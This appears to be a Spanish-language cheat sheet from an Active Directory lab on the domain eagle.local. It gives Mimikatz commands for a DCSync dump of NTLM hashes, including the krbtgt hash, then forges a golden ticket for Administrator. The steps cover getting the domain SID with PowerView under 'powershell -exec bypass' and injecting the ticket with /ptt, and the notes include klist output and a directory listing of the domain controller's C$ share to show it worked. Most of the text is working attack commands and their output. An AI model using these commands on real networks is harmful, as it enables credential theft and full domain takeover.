### Dcsync
**usuario necesita tener permisos:
- `Replicating Directory Changes`
- `Replicating Directory Changes All`**
*Devuelve hash ntlm de usuario*
```
lsadump::dcsync /domain:eagle.local /user:Administrator
lsadump::dcsync /domain:eagle.local /all
```

### GoldenTicket
- `/domain`: El nombre del dominio.
- `/sid`: El valor SID del dominio.
- `/rc4`: El hash de la contraseña de `krbtgt`.
- `/user`: El nombre de usuario para el que `Mimikatz` emitirá el ticket (Windows 2019 bloquea los tickets si son para usuarios inexistentes).
- `/id`: ID relativo (última parte del `SID`) para el usuario para el cual `Mimikatz` emitirá el ticket.
- `/renewmax`: El número máximo de días que el ticket puede ser renovado.
- `/endin`: Fin de la vida útil del ticket.

Obtener hash ntlm
```
lsadump::dcsync /domain:eagle.local /user:krbtgt
```
Obtener SID
```
powershell -exec bypass
. .\PowerView.ps1

Get-DomainSID
 S-1-5-21-1518138621-4282902758-752445584
```
Creación del golden ticket
```
 kerberos::golden /domain:eagle.local /sid:S-1-5-21-1518138621-4282902758-752445584 /rc4:db0d0630064747072a7da3f7c3b4069e /user:Administrator /id:500 /renewmax:7 /endin:8 /ptt
```
Validación que funcionó
```
C:\Mimikatz>klist

Current LogonId is 0:0x9cbd6

Cached Tickets: (1)

#0>     Client: Administrator @ eagle.local
        Server: krbtgt/eagle.local @ eagle.local
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
        Start Time: 10/13/2022 13/10/2022 06.28.43 (local)
        End Time:   10/13/2022 13/10/2022 06.36.43 (local)
        Renew Time: 10/13/2022 13/10/2022 06.35.43 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```
ó
```
C:\Mimikatz>dir \\dc1\c$
```


